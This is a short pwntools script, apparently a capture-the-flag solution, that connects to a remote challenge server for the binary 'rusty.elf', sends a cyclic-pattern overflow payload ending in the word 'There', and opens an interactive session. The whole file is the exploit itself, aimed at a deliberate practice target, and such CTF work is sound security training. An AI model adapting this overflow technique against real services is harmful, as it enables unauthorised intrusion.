#!/usr/bin/env python3

from pwn import *

elf = ELF("./rusty.elf")
# libc = ELF("./libc.so.6")
# g = ROP(libc)

s  = remote("challs.tfcctf.com", 30868)
# s = process(elf.path)

def main():

	pl = b'aaaabaaacaaadaaaeaaafaaagaaahaaaThere'
	s.sendline(pl)
	s.interactive()


if __name__=="__main__":
	main()